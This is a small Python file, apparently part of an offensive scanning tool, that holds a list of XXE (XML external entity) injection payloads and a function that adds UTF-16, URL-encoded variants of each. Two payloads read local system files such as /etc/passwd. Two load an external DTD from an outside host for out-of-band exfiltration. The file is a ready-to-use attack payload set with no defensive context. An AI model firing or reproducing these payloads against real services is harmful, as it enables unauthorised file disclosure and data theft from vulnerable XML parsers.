# -*- coding: utf-8 -*-
import urllib.parse
import copy

"""
"* Author     : M0nk3y"
"* Version    : 1.0"
"""

xxe_payloads = ['''<?x m l version = "1.0"?><!DOCTYPE ANY [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>''',
                '''<?x m l version="1.0"?> <!DOCTYPE ANY[ \n\n<!ENTITY f SYSTEM "file:///C://Windows/System32/drivers/etc/hosts">\n]>\n<x>&f;</x>''',
                '''<?x m l version="1.0"?> <!DOCTYPE test [     <!ENTITY % file SYSTEM "https://i4mhmh.cn/basuf82jk.dtd">     %file; ]> <test>&hhh;</test>''',
                '''<?x m l version="1.0"?> <!DOCTYPE test [     <!ENTITY % file SYSTEM "https://i4mhmh.cn/dasjuygdciu124.dtd">     %file; ]> <test>&hhh;</test>''',
                ]


def get_xxe_payloads():
    payloads = xxe_payloads.copy()

    for payload in xxe_payloads:
        payload = payload.encode('utf-16')
        payload = urllib.parse.quote(payload, 'utf-8')
        payloads.append(payload)

    return payloads
